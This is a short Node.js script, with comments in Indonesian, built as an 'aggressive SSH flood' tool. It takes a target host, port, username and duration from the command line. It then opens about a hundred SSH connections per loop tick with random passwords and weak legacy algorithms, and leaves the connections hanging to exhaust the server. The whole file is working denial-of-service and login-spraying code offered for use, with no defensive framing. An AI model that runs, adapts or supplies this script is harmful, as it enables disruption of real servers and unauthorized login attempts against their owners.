const { Client } = require('ssh2');

const floodSSHServer = (hostname, port, username, duration) => {
    const startTime = Date.now();

    const interval = setInterval(() => {
        if (Date.now() - startTime > duration) {
            clearInterval(interval);
            console.log('Flooding ended.');
            return;
        }

        // Meningkatkan jumlah koneksi yang dibuat per loop ke 100 koneksi
        for (let i = 0; i < 100; i++) {
            const conn = new Client();

            conn.on('ready', () => {
                console.log('Connection established, but leaving it open...');
                // Membiarkan koneksi tetap terbuka tanpa menyelesaikan otentikasi
            });

            conn.on('error', (err) => {
                console.error('SSH connection error:', err.message);
            });

            // Mengacak password dan metode autentikasi untuk setiap koneksi
            conn.connect({
                host: hostname,
                port: port,
                username: username,
                password: Math.random().toString(36).slice(2), // Password acak
                tryKeyboard: true, // Coba autentikasi keyboard-interactive
                algorithms: { // Kombinasi algoritma yang berbeda untuk autentikasi
                    kex: ['diffie-hellman-group1-sha1', 'diffie-hellman-group14-sha1'],
                    cipher: ['aes128-cbc', 'aes128-ctr'],
                    serverHostKey: ['ssh-rsa'],
                    hmac: ['hmac-sha1']
                }
            });
        }

    }, 0.1); // Interval sub-milidetik (0.1 ms) untuk membanjiri server lebih cepat
};

const host = process.argv[2];
const port = process.argv[3];
const user = process.argv[4];
const duration = process.argv[5] * 1000;

console.log(`Starting aggressive SSH flood for ${duration / 1000} seconds...`);
floodSSHServer(host, port, user, duration);
